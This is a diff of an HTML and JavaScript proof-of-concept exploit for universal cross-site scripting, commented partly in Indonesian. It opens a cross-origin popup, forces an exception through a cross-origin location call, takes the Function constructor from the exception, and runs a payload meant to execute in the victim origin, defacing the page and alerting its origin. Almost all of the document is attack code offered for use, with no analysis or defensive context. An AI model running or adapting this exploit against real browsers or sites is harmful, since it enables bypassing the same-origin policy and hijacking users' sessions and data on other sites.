@@ -1,50 +1,38 @@
-<body style="background:#111;color:#0f0;font-family:monospace;">
+<body>
 <script>
-
 // ==============================
 // CONFIG
 // ==============================
-var TARGET_URL = "https://example.com";
-var DELAY = 1500;
+var TARGET_ORIGIN = "https://example.com"; // Origin berbeda
+var DELAY = 1000;
 
 // ==============================
 // UTILS
 // ==============================
-function log(msg) {
-    console.log("[POC] " + msg);
-}
-
-function safeExec(fn) {
-    try {
-        fn();
-    } catch (e) {
-        log("Error: " + e);
-    }
-}
+function log(msg) { console.log("[POC] " + msg); }
+function safeExec(fn) { try { fn(); } catch(e){ log(e); } }
 
 // ==============================
-// STEP 1: OPEN TARGET WINDOW
+// STEP 1: OPEN CROSS-ORIGIN POPUP
 // ==============================
-function openTarget() {
-    log("Opening target window...");
-    var w = window.open(TARGET_URL);
-
-    if (!w) {
+function openPopup() {
+    log("Opening cross-origin popup...");
+    var popup = window.open(TARGET_ORIGIN, "_blank", "width=400,height=300");
+    if (!popup) {
         alert("Popup blocked!");
         return null;
     }
-
-    return w;
+    return popup;
 }
 
 // ==============================
-// STEP 2: TRIGGER EXCEPTION
+// STEP 2: TRIGGER EXCEPTION TO GET FUNCTION
 // ==============================
-function triggerException(victim) {
-    log("Triggering cross-origin exception...");
+function triggerUXSS(victim) {
+    log("Triggering exception for UXSS...");
 
     try {
-        // Force exception via cross-origin call
+        // Force exception using cross-origin call
         location.assign.call(victim.location);
     } catch (e) {
         log("Exception captured ✔");
@@ -56,36 +44,22 @@ function triggerException(victim) {
 }
 
 // ==============================
-// STEP 3: EXTRACT FUNCTION
+// STEP 3: EXECUTE PAYLOAD IN POPUP
 // ==============================
-function extractFunction(exceptionObject) {
-    log("Extracting Function constructor...");
-
-    try {
-        var func = exceptionObject.constructor.constructor;
-        log("Function extracted ✔");
-        return func;
-    } catch (err) {
-        log("Extraction failed ❌");
-        return null;
-    }
-}
-
-// ==============================
-// STEP 4: EXECUTE PAYLOAD
-// ==============================
-function executePayload(func) {
-    log("Executing payload in victim context...");
+function executePayload(exceptionObject) {
+    log("Executing payload in popup...");
 
     safeExec(function() {
+        var func = exceptionObject.constructor.constructor;
+
+        // Payload: runs inside popup origin
         func(`
-            alert("UXSS SUCCESS\\nOrigin: " + location.origin);
-
-            document.body.innerHTML = "<h1 style='color:red'>PWNED</h1>";
-
-            document.title = "Owned by UXSS";
-
-            console.log("Executed inside:", location.href);
+            document.body.style.backgroundColor = '#111';
+            document.body.style.color = '#0f0';
+            document.body.innerHTML = "<h1>UXSS - Cross-Origin Popup!</h1>";
+            document.title = "Popup Owned!";
+            alert("Popup Origin: " + location.origin);
+            console.log("Payload executed in:", location.href);
         `)();
     });
 }
@@ -94,20 +68,16 @@ function executePayload(func) {
 // MAIN FLOW
 // ==============================
 function runPoC() {
-    log("Starting PoC...");
+    log("Starting cross-origin popup PoC...");
 
-    var victim = openTarget();
-    if (!victim) return;
+    var popup = openPopup();
+    if (!popup) return;
 
     setTimeout(function() {
-
-        var ex = triggerException(victim);
+        var ex = triggerUXSS(popup);
         if (!ex) return;
 
-        var func = extractFunction(ex);
-        if (!func) return;
-
-        executePayload(func);
+        executePayload(ex);
 
     }, DELAY);
 }
@@ -116,10 +86,8 @@ function runPoC() {
 // START
 // ==============================
 runPoC();
-
 </script>
 
-<h2>UXSS PoC Running...</h2>
-<p>Check popup & console output</p>
-
+<h2>Check the popup!</h2>
+<p>This PoC opens a popup from a different origin and runs a payload in it.</p>
 </body>
